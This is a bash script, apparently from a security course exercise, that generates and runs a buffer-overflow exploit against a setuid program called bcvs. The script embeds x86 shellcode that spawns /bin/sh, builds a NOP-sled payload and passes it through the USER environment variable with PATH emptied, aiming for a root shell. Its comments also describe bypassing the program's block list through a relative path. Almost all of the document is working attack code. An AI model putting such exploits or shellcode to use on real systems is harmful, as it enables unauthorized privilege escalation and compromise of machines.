#!/bin/bash

## -------------------- Description -------------------- ##
# The bcvs program uses a relative path to check its
# "block.list". Therefore you can simply execute bcvs
# from a directory other than its usual but with the
# same directory layout and you can get around the blocks
#
# Right now this sploit is not complete but being able to
# bypass the block check is a start.
#
# Right now I am working on exploiting the strcpy/strcat
# overflow in the copyFile function.
## ----------------------------------------------------- ##

EXPLOIT_EXE="./exploit"
#SPLOIT_DIR="sploit6_dir"

# Setup necessary environment

#rm -rf $SPLIOT_DIR
#mkdir -p $SPLOIT_DIR
#cd $SPLOIT_DIR
#mkdir -p .bcvs
#touch .bcvs/block.list
#touch .bcvs/blah
rm -rf exploit
rm -rf exploit.c

cat <<EOS > "exploit.c"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define DEFAULT_OFFSET 0
#define DEFAULT_BSIZE 256
#define NOP 0x90

// Shellcode for exec of /bin/sh
char shellcode[] = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";


unsigned long get_sp(void) {
  __asm__("movl %esp, %eax");
}

void main(int argc, char* argv[]) {
  char buff[DEFAULT_BSIZE];
  char *ptr;
  long *long_ptr, addr;
  int i = 0;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BSIZE;

  if (argc > 1) offset = atoi(argv[1]);

  addr = get_sp() - offset;


  ptr = buff;

  long_ptr = (long *) (ptr);
  //First we fill the buffer with our best guess of the address for
  //the buffer in the attacked program
  for (i = 0; long_ptr < (buff + 60); i += 4) {
	*(long_ptr++) = addr;
  }

  // Setup the nop sled
  char *buf_ptr = (char *) (ptr + 60); 
  for (i = (buff + 60); i < (buff + bsize); ++i) {
    *(buf_ptr++) = NOP;
    //buff[i] = NOP;
  }

  // Insert our shellcode
  ptr = (buff + 186);
  for (i = 0; i < strlen(shellcode); ++i) {
    *(ptr++) = shellcode[i];
  }

  buff[bsize-1] = '\0';
  printf(buff);
  return;
}

EOS



gcc -o exploit exploit.c

SHELL_CODE=$($EXPLOIT_EXE)

OFFSET=100

SHELL_CODE=$($EXPLOIT_EXE $OFFSET)
#/opt/bcvs/bcvs ci "${SHELL_CODE}"
export USER=${SHELL_CODE}
export PATH=""
echo ${USER}
echo ${PATH}

echo "junk" > "dummy_input"
/opt/bcvs/bcvs ci blah < dummy_input
/opt/bcvs/bcvs co blah < dummy_input

# And then hopefully you have a root shell at this point
